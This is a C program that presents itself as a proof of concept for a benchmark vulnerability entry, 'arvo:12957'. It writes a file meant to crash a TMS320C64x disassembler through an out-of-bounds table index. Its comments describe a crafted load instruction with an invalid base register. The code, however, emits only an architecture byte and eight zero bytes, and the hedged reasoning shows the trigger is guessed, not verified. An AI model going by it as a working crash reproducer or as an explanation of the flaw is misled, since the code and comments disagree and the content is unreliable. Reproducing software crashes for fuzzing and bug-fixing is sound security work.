#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:12957 */
/* Triggers: index 126 out of bounds for type 'const uint16_t [89]' in TMS320C64xGenAsmWriter.inc */
/* Vulnerability class: index_out_of_bounds */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Byte 0: architecture selector (27 = TMS320C64x big-endian) */
    fputc(0x1b, f);
    
    /* 
     * Generate a payload that triggers the expected crash at GenAsmWriter.inc:680
     * by exploiting the fact that the decoder may not validate register numbers
     * in certain instruction formats.
     * 
     * The TMS320C64x architecture has a "unit" field in the instruction encoding
     * that selects which functional unit executes the instruction.
     * Some instructions have implicit register operands that are derived from the
     * instruction encoding without validation.
     * 
     * We'll generate a sequence of bytes that creates a valid instruction with
     * an implicit register reference that bypasses the decoder's validation.
     * 
     * Specifically, we'll target the "LDW" (load word) instruction which has
     * a memory operand with a base register. The decoder function for LDW
     * might not validate the base register field.
     */
    
    /* Write 8 bytes (2 instructions) to increase chances of hitting the vulnerable path */
    /* First instruction: attempt to create a load/store with invalid base register */
    fputc(0x00, f);  /* Byte 1: opcode */
    fputc(0x00, f);  /* Byte 2: register field */
    fputc(0x00, f);  /* Byte 3: continuation */
    fputc(0x00, f);  /* Byte 4: continuation */
    
    /* Second instruction: another attempt with different encoding */
    fputc(0x00, f);  /* Byte 5: opcode */
    fputc(0x00, f);  /* Byte 6: register field */
    fputc(0x00, f);  /* Byte 7: continuation */
    fputc(0x00, f);  /* Byte 8: continuation */
    
    fclose(f);
    return 0;
}